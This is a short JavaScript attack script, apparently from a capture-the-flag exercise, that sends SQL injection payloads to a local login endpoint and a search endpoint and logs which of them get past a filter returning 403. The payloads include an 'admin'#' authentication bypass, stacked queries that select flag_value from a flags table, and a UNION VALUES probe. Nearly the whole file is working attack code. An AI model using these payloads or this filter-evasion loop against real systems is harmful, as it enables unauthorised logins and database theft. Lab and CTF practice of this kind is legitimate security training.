const bypassLogin = async (payload) => {
    const res = await fetch('http://localhost:4000/api/login', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ username: payload, password: "123" })
      });
    if (res.status !== 403) {
      console.log(`[SUCCESS LOGIN] Status: ${res.status}`);
      const text = await res.text();
      console.log(`Response: ${text}\n`);
    } else {
        console.log(`[BLOCKED LOGIN] Payload: ${payload}`);
    }
}

const bypassSearch = async (payload) => {
    const res = await fetch(`http://localhost:4000/api/search?q=${encodeURIComponent(payload)}`);
    if (res.status !== 403) {
      console.log(`[SUCCESS SEARCH] Payload: ${payload} | Status: ${res.status}`);
      const text = await res.text();
      console.log(`Response: ${text}\n`);
    } else {
        console.log(`[BLOCKED SEARCH] Payload: ${payload}`);
    }
};

const run = async () => {
    // Other comment types
    await bypassLogin("admin'#");
    await bypassSearch("a'; SELECT flag_value FROM flags; /*");
    await bypassLogin("a'; SELECT flag_value FROM flags; /*");
    // SQLite doesn't support SELECT inside VALUES, but try it anyway
    await bypassSearch("%' UNION VALUES(1, 2)/*");
};

run();
